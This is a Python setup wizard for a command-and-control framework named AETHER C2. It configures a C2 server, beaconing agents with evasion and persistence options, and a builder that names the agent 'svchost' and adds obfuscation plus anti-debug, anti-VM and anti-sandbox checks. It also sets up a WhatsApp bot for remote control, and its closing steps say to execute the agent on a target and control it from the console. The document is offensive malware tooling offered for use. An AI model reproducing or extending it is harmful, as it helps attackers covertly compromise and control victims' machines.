#!/usr/bin/env python3
"""
AETHER C2 MASTER SETUP SCRIPT
Interactive setup wizard for complete system deployment
Handles all components: server, agent, bot, builder, and stager
"""

import os, sys, json, subprocess, platform, shutil, random, string
from pathlib import Path
from datetime import datetime
import socket

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class MasterSetup:
    def __init__(self):
        self.base_path = Path(__file__).parent.absolute()
        self.config = {}
        self.python_version = sys.version_info
        self.os_type = platform.system()
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if self.os_type == 'Windows' else 'clear')
    
    def print_header(self, title):
        """Print formatted header"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}")
        print(f"  {title.center(56)}")
        print(f"{'='*60}{Colors.ENDC}\n")
    
    def print_success(self, msg):
        print(f"{Colors.GREEN}✓ {msg}{Colors.ENDC}")
    
    def print_error(self, msg):
        print(f"{Colors.RED}✗ {msg}{Colors.ENDC}")
    
    def print_warning(self, msg):
        print(f"{Colors.YELLOW}⚠ {msg}{Colors.ENDC}")
    
    def print_info(self, msg):
        print(f"{Colors.BLUE}ℹ {msg}{Colors.ENDC}")
    
    def get_input(self, prompt, default=None):
        """Get user input with optional default"""
        if default:
            text = f"{prompt} [{default}]: "
        else:
            text = f"{prompt}: "
        
        result = input(f"{Colors.CYAN}{text}{Colors.ENDC}")
        return result if result else default
    
    def get_yes_no(self, prompt):
        """Get yes/no input"""
        while True:
            response = input(f"{Colors.CYAN}{prompt} (y/n): {Colors.ENDC}").lower()
            if response in ['y', 'yes']:
                return True
            elif response in ['n', 'no']:
                return False
            print("Please enter 'y' or 'n'")
    
    def get_choice(self, prompt, options):
        """Get choice from list"""
        print(f"\n{Colors.CYAN}{prompt}{Colors.ENDC}")
        for i, option in enumerate(options, 1):
            print(f"  {i}. {option}")
        
        while True:
            try:
                choice = int(input(f"\n{Colors.CYAN}Select (1-{len(options)}): {Colors.ENDC}"))
                if 1 <= choice <= len(options):
                    return options[choice - 1]
                print("Invalid choice")
            except ValueError:
                print("Please enter a number")
    
    def generate_random_string(self, length=32):
        """Generate random string for keys"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def check_python_version(self):
        """Check Python version"""
        self.print_header("Python Version Check")
        
        if self.python_version.major < 3 or (self.python_version.major == 3 and self.python_version.minor < 8):
            self.print_error(f"Python 3.8+ required, found {self.python_version.major}.{self.python_version.minor}")
            return False
        
        self.print_success(f"Python {self.python_version.major}.{self.python_version.minor}.{self.python_version.micro} detected")
        return True
    
    def setup_server_config(self):
        """Configure AETHER Server"""
        self.print_header("AETHER Server Configuration")
        
        self.print_info("Configure C2 server settings")
        
        server_config = {
            'c2_host': self.get_input("C2 Server Hostname", "0.0.0.0"),
            'c2_port': int(self.get_input("C2 Server Port", "443")),
            'c2_protocol': self.get_choice("C2 Protocol", ["https", "http"]),
            'encryption_key': self.generate_random_string(64),
            'server_password': self.get_input("Server Console Password", self.generate_random_string(12)),
        }
        
        self.print_success(f"Server will listen on {server_config['c2_host']}:{server_config['c2_port']}")
        
        return server_config
    
    def setup_whatsapp_config(self):
        """Configure WhatsApp Integration"""
        self.print_header("WhatsApp Bot Configuration")
        
        if not self.get_yes_no("Enable WhatsApp integration?"):
            return None
        
        whatsapp_config = {
            'bot_enabled': True,
            'bot_url': self.get_input("Bot Server URL", "http://localhost:3000"),
            'bot_api_key': self.get_input("Bot API Key (optional)", self.generate_random_string(32)),
            'auth_password': self.get_input("WhatsApp Auth Password", self.generate_random_string(12)),
            'authorized_users': [],
        }
        
        while self.get_yes_no("Add authorized WhatsApp number?"):
            phone = self.get_input("Phone number (international format, +1234567890)")
            if phone:
                whatsapp_config['authorized_users'].append(phone)
                self.print_success(f"Added {phone}")
        
        self.print_info(f"Added {len(whatsapp_config['authorized_users'])} authorized users")
        
        return whatsapp_config
    
    def setup_agent_config(self):
        """Configure AETHER Agent"""
        self.print_header("AETHER Agent Configuration")
        
        agent_config = {
            'c2_host': self.get_input("C2 Server Address (for agents)", "garden-helper.fi"),
            'c2_port': int(self.get_input("C2 Server Port (for agents)", "443")),
            'c2_protocol': self.get_choice("C2 Protocol (for agents)", ["https", "http"]),
            'beacon_interval': int(self.get_input("Beacon Interval (seconds)", "30")),
            'jitter_percent': int(self.get_input("Jitter Percentage", "20")),
            'sleep_time': int(self.get_input("Sleep Duration (seconds)", "5")),
            'enable_evasion': self.get_yes_no("Enable Evasion Techniques?"),
            'enable_persistence': self.get_yes_no("Enable Persistence Mechanisms?"),
        }
        
        self.print_success("Agent configuration prepared")
        
        return agent_config
    
    def setup_builder_config(self):
        """Configure Builder"""
        self.print_header("Builder Configuration")
        
        builder_config = {
            'output_name': self.get_input("Agent Output Filename", "svchost"),
            'icon_path': self.get_input("Icon Path (optional)", "builder/default.ico"),
            'use_pyarmor': self.get_yes_no("Use PyArmor obfuscation?"),
            'use_upx': self.get_yes_no("Use UPX compression?"),
            'obfuscation_level': self.get_choice("Obfuscation Level", ["low", "medium", "high"]),
            'add_anti_debug': self.get_yes_no("Add Anti-Debug?"),
            'add_anti_vm': self.get_yes_no("Add Anti-VM?"),
            'add_anti_sandbox': self.get_yes_no("Add Anti-Sandbox?"),
        }
        
        self.print_success("Builder configuration prepared")
        
        return builder_config
    
    def install_python_dependencies(self):
        """Install Python dependencies"""
        self.print_header("Installing Python Dependencies")
        
        if not os.path.exists('requirements.txt'):
            self.print_error("requirements.txt not found")
            return False
        
        self.print_info("Installing packages from requirements.txt...")
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt', '-q'], 
                         check=True, cwd=self.base_path)
            self.print_success("Python dependencies installed")
            return True
        except subprocess.CalledProcessError as e:
            self.print_error(f"Failed to install dependencies: {e}")
            return False
    
    def install_nodejs_dependencies(self):
        """Install Node.js dependencies"""
        self.print_header("Installing Node.js Dependencies")
        
        bot_path = self.base_path / 'WA-BOT-Base'
        
        if not bot_path.exists():
            self.print_error("WA-BOT-Base not found")
            return False
        
        if not (bot_path / 'package.json').exists():
            self.print_error("package.json not found in WA-BOT-Base")
            return False
        
        # Check if Node.js is installed
        try:
            subprocess.run(['node', '--version'], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            self.print_error("Node.js not installed. Please install Node.js 16+ from https://nodejs.org/")
            return False
        
        self.print_info("Installing npm packages...")
        try:
            subprocess.run(['npm', 'install'], check=True, cwd=bot_path, capture_output=True)
            self.print_success("Node.js dependencies installed")
            return True
        except subprocess.CalledProcessError as e:
            self.print_error(f"Failed to install npm packages: {e}")
            return False
    
    def create_configuration_files(self, full_config):
        """Create configuration files from template"""
        self.print_header("Creating Configuration Files")
        
        # Create main config.json
        config_data = {
            'c2_host': full_config['server'].get('c2_host', '0.0.0.0'),
            'c2_port': full_config['server'].get('c2_port', 443),
            'c2_protocol': full_config['server'].get('c2_protocol', 'https'),
            'encryption_key': full_config['server'].get('encryption_key'),
            'universal_c2': {
                'enabled': True,
                'channels': [
                    {
                        'type': 'https_direct',
                        'host': full_config['agent'].get('c2_host', 'garden-helper.fi'),
                        'port': full_config['agent'].get('c2_port', 443),
                        'path': '/api/v1/beacon',
                        'priority': 1
                    }
                ]
            },
            'agent': full_config['agent'],
            'builder': full_config['builder'],
        }
        
        if full_config.get('whatsapp'):
            config_data['whatsapp'] = full_config['whatsapp']
        
        try:
            with open(self.base_path / 'config.json', 'w') as f:
                json.dump(config_data, f, indent=2)
            self.print_success("config.json created")
        except Exception as e:
            self.print_error(f"Failed to create config.json: {e}")
            return False
        
        # Create WhatsApp config if enabled
        if full_config.get('whatsapp'):
            whatsapp_config_content = self._generate_whatsapp_config(full_config['whatsapp'])
            try:
                whatsapp_config_path = self.base_path / 'server' / 'comms' / 'whatsapp_config.py'
                with open(whatsapp_config_path, 'w') as f:
                    f.write(whatsapp_config_content)
                self.print_success("whatsapp_config.py created")
            except Exception as e:
                self.print_error(f"Failed to create whatsapp_config.py: {e}")
                return False
        
        return True
    
    def _generate_whatsapp_config(self, wa_config):
        """Generate WhatsApp config file content"""
        users_list = ", ".join([f"'{user}'" for user in wa_config.get('authorized_users', [])])
        
        return f'''#!/usr/bin/env python3
"""
WhatsApp Integration Configuration
Auto-generated by MASTER_SETUP.py
"""

WHATSAPP_CONFIG = {{
    # Bot Server Configuration
    'bot_url': '{wa_config.get('bot_url', 'http://localhost:3000')}',
    'bot_api_key': '{wa_config.get('bot_api_key', 'your-api-key')}',
    
    # Security
    'auth_password': '{wa_config.get('auth_password', 'aether2025')}',  # Change this!
    'authorized_users': [{users_list}],
    
    # Features
    'enable_command_history': True,
    'enable_session_linking': True,
    'max_message_length': 4096,
    'command_timeout': 30,
}}


class WhatsAppIntegration:
    """WhatsApp integration manager"""
    
    def __init__(self, config: dict = None):
        from .whatsapp_bridge import WhatsAppBridge
        self.config = config or WHATSAPP_CONFIG.copy()
        self.bridge = None
        self.initialized = False
    
    def initialize(self, session_manager, command_suite) -> bool:
        """Initialize integration"""
        try:
            from .whatsapp_bridge import WhatsAppBridge
            
            self.bridge = WhatsAppBridge(
                bot_url=self.config.get('bot_url', 'http://localhost:3000'),
                bot_api_key=self.config.get('bot_api_key', ''),
                session_manager=session_manager,
                command_suite=command_suite
            )
            
            for phone in self.config.get('authorized_users', []):
                self.bridge.authorize_user(phone)
            
            self.initialized = True
            return True
        except Exception as e:
            print(f"Failed to initialize: {{e}}")
            return False
    
    def start(self):
        """Start listening"""
        if self.bridge:
            self.bridge.start_listener()
    
    def stop(self):
        """Stop listening"""
        if self.bridge:
            self.bridge.stop_listener()
    
    def get_status(self):
        """Get integration status"""
        return {{
            'initialized': self.initialized,
            'bridge_active': self.bridge.running if self.bridge else False,
            'config': self.config
        }}
'''
    
    def validate_installation(self):
        """Validate project structure"""
        self.print_header("Validating Installation")
        
        required_dirs = [
            'agent', 'server', 'builder', 'stager', 'WA-BOT-Base'
        ]
        
        required_files = [
            'agent/aether_agent.py',
            'server/aether_server.py',
            'builder/compile.py',
            'stager/stager.py',
            'requirements.txt'
        ]
        
        all_valid = True
        
        for dir_name in required_dirs:
            dir_path = self.base_path / dir_name
            if dir_path.exists():
                self.print_success(f"Directory found: {dir_name}/")
            else:
                self.print_error(f"Missing directory: {dir_name}/")
                all_valid = False
        
        for file_name in required_files:
            file_path = self.base_path / file_name
            if file_path.exists():
                self.print_success(f"File found: {file_name}")
            else:
                self.print_error(f"Missing file: {file_name}")
                all_valid = False
        
        return all_valid
    
    def display_summary(self, full_config):
        """Display configuration summary"""
        self.print_header("Configuration Summary")
        
        print(f"{Colors.BOLD}Server Configuration:{Colors.ENDC}")
        print(f"  Host: {full_config['server'].get('c2_host')}")
        print(f"  Port: {full_config['server'].get('c2_port')}")
        print(f"  Protocol: {full_config['server'].get('c2_protocol')}")
        
        print(f"\n{Colors.BOLD}Agent Configuration:{Colors.ENDC}")
        print(f"  C2 Host: {full_config['agent'].get('c2_host')}")
        print(f"  C2 Port: {full_config['agent'].get('c2_port')}")
        print(f"  Beacon Interval: {full_config['agent'].get('beacon_interval')}s")
        print(f"  Evasion Enabled: {full_config['agent'].get('enable_evasion')}")
        print(f"  Persistence Enabled: {full_config['agent'].get('enable_persistence')}")
        
        if full_config.get('whatsapp'):
            print(f"\n{Colors.BOLD}WhatsApp Configuration:{Colors.ENDC}")
            print(f"  Enabled: True")
            print(f"  Bot URL: {full_config['whatsapp'].get('bot_url')}")
            print(f"  Authorized Users: {len(full_config['whatsapp'].get('authorized_users', []))}")
        
        print(f"\n{Colors.BOLD}Builder Configuration:{Colors.ENDC}")
        print(f"  Output Name: {full_config['builder'].get('output_name')}")
        print(f"  PyArmor Enabled: {full_config['builder'].get('use_pyarmor')}")
        print(f"  Obfuscation Level: {full_config['builder'].get('obfuscation_level')}")
    
    def show_next_steps(self):
        """Show next steps after setup"""
        self.print_header("Next Steps")
        
        print(f"{Colors.BOLD}1. Start AETHER Server{Colors.ENDC}")
        print(f"   $ python3 server/aether_server.py")
        print(f"   The server will listen on the configured port\n")
        
        print(f"{Colors.BOLD}2. Start WhatsApp Bot (Optional){Colors.ENDC}")
        print(f"   $ cd WA-BOT-Base && npm start")
        print(f"   Scan QR code with WhatsApp when prompted\n")
        
        print(f"{Colors.BOLD}3. Enable WhatsApp Integration (In AETHER Console){Colors.ENDC}")
        print(f"   AETHER> whatsapp enable")
        print(f"   AETHER> whatsapp status\n")
        
        print(f"{Colors.BOLD}4. Build Agent{Colors.ENDC}")
        print(f"   $ python3 builder/compile.py")
        print(f"   Or use AETHER server: AETHER> generate\n")
        
        print(f"{Colors.BOLD}5. Deploy & Control{Colors.ENDC}")
        print(f"   Execute agent on target")
        print(f"   Control via: AETHER> interact <agent_id>\n")
        
        print(f"{Colors.BOLD}Documentation:{Colors.ENDC}")
        print(f"   • MASTER_SETUP.py - This script")
        print(f"   • COMPLETE_SETUP_GUIDE.md - Full configuration guide")
        print(f"   • WHATSAPP_BOT_INTEGRATION.md - WhatsApp integration guide")
        print(f"   • DEPLOYMENT_GUIDE.py - Deployment procedures")
    
    def run(self):
        """Run complete setup wizard"""
        self.clear_screen()
        
        print(f"""{Colors.CYAN}{Colors.BOLD}
╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗ 
║ ╦╠═╝ ║ ╠═╝║  ║╣ ╠╦╝ 
╚═╝╩   ╩ ╩  ╩═╝╚═╝╩╚═ 

C2 MASTER SETUP WIZARD v1.0
{Colors.ENDC}
        """)
        
        # Step 1: Check Python version
        if not self.check_python_version():
            sys.exit(1)
        
        # Step 2: Validate installation
        if not self.validate_installation():
            self.print_warning("Some files/directories are missing")
            if not self.get_yes_no("Continue anyway?"):
                sys.exit(1)
        
        # Step 3: Setup configurations
        full_config = {
            'timestamp': datetime.now().isoformat(),
            'os': self.os_type,
            'python_version': f"{self.python_version.major}.{self.python_version.minor}.{self.python_version.micro}",
        }
        
        full_config['server'] = self.setup_server_config()
        full_config['agent'] = self.setup_agent_config()
        full_config['builder'] = self.setup_builder_config()
        full_config['whatsapp'] = self.setup_whatsapp_config()
        
        # Step 4: Install dependencies
        if self.get_yes_no("\nInstall Python dependencies?"):
            self.install_python_dependencies()
        
        if self.get_yes_no("Install Node.js dependencies?"):
            self.install_nodejs_dependencies()
        
        # Step 5: Create configuration files
        if not self.create_configuration_files(full_config):
            self.print_error("Failed to create configuration files")
            sys.exit(1)
        
        # Step 6: Display summary
        self.display_summary(full_config)
        
        # Step 7: Save full config
        try:
            config_path = self.base_path / '.aether_config.json'
            with open(config_path, 'w') as f:
                json.dump(full_config, f, indent=2)
            self.print_success(f"Configuration saved to {config_path}")
        except Exception as e:
            self.print_error(f"Failed to save configuration: {e}")
        
        # Step 8: Show next steps
        self.show_next_steps()
        
        self.print_success("Setup wizard completed successfully!")
        print()

if __name__ == '__main__':
    setup = MasterSetup()
    try:
        setup.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Setup cancelled by user{Colors.ENDC}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Error: {e}{Colors.ENDC}\n")
        sys.exit(1)
